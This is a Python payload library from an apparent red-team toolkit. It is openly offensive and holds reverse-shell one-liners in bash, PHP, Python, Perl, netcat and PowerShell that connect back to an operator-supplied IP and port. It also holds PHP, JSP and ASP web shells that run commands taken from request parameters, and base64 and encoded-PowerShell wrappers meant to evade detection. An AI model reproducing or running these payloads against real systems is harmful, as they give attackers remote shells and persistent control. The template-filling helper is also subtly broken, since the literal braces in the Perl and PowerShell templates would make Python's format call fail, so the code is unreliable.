# RedOps3 Payload Library
# V1.0 - Ported from RedOps2

PAYLOADS = {
    "reverse_shells": {
        "bash_tcp": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash_udp": "sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "php_exec": "php -r '$sock=fsockopen(\"{ip}\", {port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "python_pty": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "perl_sh": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "nc_e": "nc -e /bin/sh {ip} {port}",
        "nc_fifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "powershell_tcp": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    },
    "web_shells": {
        "php_simple": "<?php system($_GET['cmd']); ?>",
        "php_post": "<?php system($_POST['cmd']); ?>",
        "jsp_simple": "<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); %>",
        "asp_simple": "<% eval request(\"cmd\") %>"
    },
    "evasion_encoders": {
        "base64_php": "<?php eval(base64_decode('{payload_b64}')); ?>",
        "powershell_enc": "powershell -enc {payload_b16}"
    }
}

def get_reverse_shell(shell_type, ip, port):
    template = PAYLOADS["reverse_shells"].get(shell_type)
    if template:
        return template.format(ip=ip, port=port)
    return None

def get_web_shell(shell_type):
    return PAYLOADS["web_shells"].get(shell_type)
